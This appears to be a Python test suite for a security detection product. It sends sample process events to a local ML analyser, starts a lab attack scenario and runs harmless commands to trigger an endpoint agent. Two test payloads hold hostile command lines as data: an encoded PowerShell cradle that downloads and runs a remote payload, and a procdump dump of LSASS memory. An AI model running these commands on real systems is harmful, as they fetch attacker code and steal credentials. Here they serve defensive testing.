"""
CyberFusion XDR Enterprise - Automated Threat & ML Simulation Suite
Validates:
1. Direct Local ML Inference (Benign vs Anomaly vs LOLBin Obfuscation)
2. Segregated LAB Mode Scenario Execution (APT29 Cozy Bear)
3. Live Host Simulation for Live EDR Agent Detection (MITRE ATT&CK TTPs)
4. Central Pipeline & Alert Verification
"""
import sys
import time
import subprocess
import httpx

API_BASE = "http://127.0.0.1:8000"

def log(msg: str):
    print(f"[CYBERFUSION-SIM] {msg}")

def check_backend_health():
    """Verify backend is reachable."""
    try:
        r = httpx.get(f"{API_BASE}/", timeout=3.0)
        return r.status_code == 200
    except Exception:
        return False

def test_ml_inference():
    """Test the local ML inference engine with sample benign and malicious payloads."""
    log("\n" + "="*60)
    log("TEST 1: Local ML Inference Engine (T1059 / T1027 Obfuscation)")
    log("="*60)

    test_cases = [
        {
            "label": "Benign Developer Command",
            "payload": {
                "process_name": "git.exe",
                "command_line": "git.exe status -s",
                "parent_process": "code.exe"
            }
        },
        {
            "label": "Suspicious Obfuscated PowerShell Download Cradle",
            "payload": {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNS9wYXlsb2FkJyk=",
                "parent_process": "winword.exe"
            }
        },
        {
            "label": "LSASS Memory Dump Attempt",
            "payload": {
                "process_name": "procdump.exe",
                "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
                "parent_process": "cmd.exe"
            }
        }
    ]

    for tc in test_cases:
        log(f"\n[*] Evaluating: {tc['label']}")
        try:
            res = httpx.post(f"{API_BASE}/api/v1/ml/analyze", json=tc["payload"], timeout=5.0)
            if res.status_code == 200:
                data = res.json()
                verdict = data.get("verdict")
                score = data.get("risk_score")
                factors = data.get("factors", [])
                log(f"    --> Verdict:    {verdict} (Risk: {score}/100, Sev: {data.get('severity')})")
                log(f"    --> MITRE:      {data.get('mitre_tactic')} - {data.get('mitre_technique')}")
                for f in factors:
                    log(f"        • Factor: {f}")
            else:
                log(f"    [-] ML analyze returned {res.status_code}: {res.text}")
        except Exception as e:
            log(f"    [-] ML request error: {e}")

def test_lab_scenario():
    """Trigger the APT29 Cozy Bear attack scenario in LAB mode."""
    log("\n" + "="*60)
    log("TEST 2: Isolated LAB Mode Simulation (APT29 Cozy Bear)")
    log("="*60)
    try:
        res = httpx.post(f"{API_BASE}/api/v1/lab/simulate/APT29_COZY_BEAR", timeout=5.0)
        if res.status_code == 200:
            log(f"  [+] LAB Scenario dispatced: {res.json()}")
        else:
            log(f"  [-] Failed: {res.status_code} - {res.text}")
    except Exception as e:
        log(f"  [-] Scenario error: {e}")

def test_live_host_agent():
    """
    Spawns benign test commands locally on the Windows host to trigger
    the running CyberFusion Live Agent's real telemetry collection loop.
    """
    log("\n" + "="*60)
    log("TEST 3: Live Host Threat Execution (Triggering Live EDR Agent)")
    log("="*60)

    sims = [
        {
            "name": "PowerShell Encoded String (Benign payload)",
            "cmd": ["powershell.exe", "-nop", "-w", "hidden", "-EncodedCommand", "V3JpdGUtSG9zdCAnQ3liZXJGdXNpb24gVEVTVCBPQkZVU0NBVElPTic="]
        },
        {
            "name": "Certutil LOLBin Ingress Flag Check",
            "cmd": ["certutil.exe", "-?", "nul"]
        },
        {
            "name": "Account Discovery (net.exe user)",
            "cmd": ["net.exe", "user"]
        }
    ]

    for s in sims:
        log(f"\n[*] Executing: {s['name']}")
        try:
            p = subprocess.run(s["cmd"], capture_output=True, text=True, timeout=5)
            log("    [+] Process executed on OS. Agent will collect within next 4-second poll cycle.")
            time.sleep(4)
        except Exception as ex:
            log(f"    [-] Execution error: {ex}")

def test_learning_mode():
    """Verify endpoint Learning Mode tracking and baseline calibration."""
    log("\n" + "="*60)
    log("TEST 2: Endpoint Learning Mode & Baseline Calibration State")
    log("="*60)
    try:
        res = httpx.get(f"{API_BASE}/api/v1/ml/learning/profiles", timeout=5.0)
        if res.status_code == 200:
            profiles = res.json()
            log(f"[+] Total Managed Endpoint Profiles: {len(profiles)}")
            for p in profiles:
                log(f"    - Endpoint:   {p.get('host_id')}")
                log(f"      State:      {p.get('state')} (Progress: {p.get('progress')})")
                log(f"      Lineages:   {p.get('known_lineages_count')} learned allowlisted process pairs")
                log(f"      Binaries:   {p.get('known_binaries_count')} learned unique software binaries")
                log(f"      Threshold:  {p.get('calibrated_threshold')}")
        else:
            log(f"[-] Learning profiles returned status {res.status_code}: {res.text}")
    except Exception as e:
        log(f"[-] Learning mode inspection error: {e}")

def verify_alerts():
    """Fetch recent alerts from backend to verify successful detection."""
    log("\n" + "="*60)
    log("TEST 5: Verification of Generated Alerts in Central Console")
    log("="*60)
    try:
        res = httpx.get(f"{API_BASE}/api/v1/detections/alerts?limit=5", timeout=5.0)
        if res.status_code == 200:
            alerts = res.json()
            log(f"[+] Total recent alerts retrieved: {len(alerts)}")
            for a in alerts[:5]:
                log(f"    - [{a.get('severity')}] {a.get('title')} (Rule: {a.get('rule_id')}, ATT&CK: {a.get('mitre_technique')})")
        else:
            log(f"[-] Alerts status {res.status_code}: {res.text}")
    except Exception as e:
        log(f"[-] Could not query alerts: {e}")

if __name__ == "__main__":
    log("Starting CyberFusion XDR Threat & ML Simulation Suite...")
    if not check_backend_health():
        log("ERROR: Central backend is not responding on http://127.0.0.1:8000. Please ensure the backend is running.")
        sys.exit(1)

    test_ml_inference()
    test_learning_mode()
    test_lab_scenario()
    test_live_host_agent()
    time.sleep(2)
    verify_alerts()
    log("\n[SUCCESS] Threat simulation and ML verification completed successfully.")
